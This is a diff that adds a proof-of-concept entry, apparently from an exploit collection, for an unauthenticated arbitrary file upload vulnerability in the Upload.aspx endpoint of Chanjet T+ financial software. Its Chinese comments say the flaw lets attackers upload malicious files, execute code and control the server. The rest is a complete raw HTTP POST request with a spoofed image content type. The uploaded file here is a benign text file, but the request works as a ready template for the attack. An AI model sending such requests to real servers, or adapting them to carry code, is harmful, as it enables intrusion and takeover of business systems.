@@ -1,0 +1,16 @@
+# 用友畅捷通T+Upload.aspx任意文件上传漏洞
+# 畅捷通T+是一款互联网企业财务管理软件。Upload.aspx接口存在未授权访问漏洞。攻击者可构造恶意请求上传恶意文件，从而执行任意代码，控制服务器。
+POST /tplus/SM/SetupAccount/Upload.aspx?preload=1&acid=80000898&bid=hd_tag_m8mv24di HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24di
+RM-PRO-Token: fe93d0a5c0e1da214a3b3f529815fad9
+RM-PRO-Time: 1742808375951
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVXR9biLu
+
+------WebKitFormBoundaryVXR9biLu
+Content-Disposition: form-data; name="File1";filename="poc.txt"
+Content-Type: image/jpeg
+
+Hello!
+------WebKitFormBoundaryVXR9biLu--
